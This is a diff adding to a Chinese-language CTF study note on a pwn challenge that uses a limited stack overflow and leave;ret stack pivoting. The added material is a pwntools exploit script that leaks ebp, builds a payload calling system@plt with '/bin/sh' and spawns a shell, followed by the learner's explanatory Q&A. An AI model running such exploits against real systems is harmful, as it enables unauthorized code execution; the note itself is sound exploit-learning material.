@@ -99,6 +99,92 @@ p.interactive()
 #### 考点：栈溢出至rbp，然后靠函数退出的leave;retn进行栈迁移
 
 #### 附件：
-![[pwn1]]
 
+![[../../Pasted image 20250930132314.png]]
+
+
+![[../../Pasted image 20250930132625.png]]
+
+![[../../Pasted image 20250930131441.png]]
+
+![[../../Pasted image 20250930131534.png]]
+
+![[../../Pasted image 20250930131955.png]]
+
+```
+0xffd30358-0xffd30320=0x38
+这就是rbp到数据输入的初始地址的距离
+```
+
+首先是泄露rbp指向的地址里面的地址，然后布置栈帧
+
+这个题目从反汇编看起来只能溢出到rbp，溢出不到ret
+```python
+from pwn import *
+
+p = process("./pwn")
+
+leave_ret = 0x08048669
+
+system_addr = 0x08048400
+
+  
+
+p.send(b"a"*0x2B+b'b')
+
+p.recvuntil(b'b')
+
+ebp_addr = u32(p.recv(4))
+
+print(hex(ebp_addr))
+
+stack = ebp_addr-0x38
+
+  
+
+payload = p32(0xdeadbeef)+p32(system_addr)+p32(0xdeadbeef)+p32(stack+0x10)+b"/bin/sh\x00"
+
+payload = payload.ljust(0x2C,b'a')
+
+payload += p32(stack)+p32(leave_ret)
+
+p.send(payload)
+
+p.interactive()
+
+  
+
+"""
+
+1.为什么要用 send 发送最后的 b? 为什么sendline 不行？
+![[../../待整理文件/send_and_sendline|send_and_sendline]]
+
+2.为什么能够接收 rbp 的值,这个值是指什么？
+got it，打印出来的是rbp指向地址中的地址
+3.栈的距离怎么算的？为什么是 0x38?
+got it,如上图栈空间计算
+
+"""
+```
+
+```markdown
+​
+4.为什么 system 的地址要用plt 表，为什么直接用 system 地址不行？
+
+1. call system指令的本质是 “带上下文的调用”​
+   
+- 该call指令的下一条指令（add esp, 4）会在调用结束后修正栈指针,如果你直接跳转到这个call_system指令的地址，程序会执行这次调用，但此时栈上的参数是原程序的参数（可能不是你想要的/bin/sh），且调用结束后会按照原程序的逻辑继续执行（add esp, 4等），无法控制后续流程。​
+
+2. PLT 表地址是system函数的 “纯净入口”​
+
+- 调用system@plt时，参数需要由攻击者自己控制（按照 C 语言函数调用约定，参数需要压在栈上，位于返回地址之后）。这意味着你可以在栈上构造/bin/sh字符串的地址作为参数，让system执行你想要的命令。​
+
+1. 动态链接的 “重定位” 特性
+- 而程序中已有的call_system指令，其本质是对system@plt的一次调用（汇编层面可能直接编码为call system@plt），但它本身是一个固定的指令地址，不具备 “找到system实际地址” 的能力 —— 你跳转到这个call指令，本质上还是间接依赖 PLT 表，但多了一层不必要的上下文限制。​
+
+总结​
+- 直接跳转到call system指令，相当于 “借用” 程序中已有的一次system调用，但你无法自由控制参数和后续流程；​
+
+- 跳转到system@plt，相当于 “直接调用system函数”，你可以完全控制参数（比如传入/bin/sh）和执行流程，这正是 PWN 攻击需要的。​
+```
 
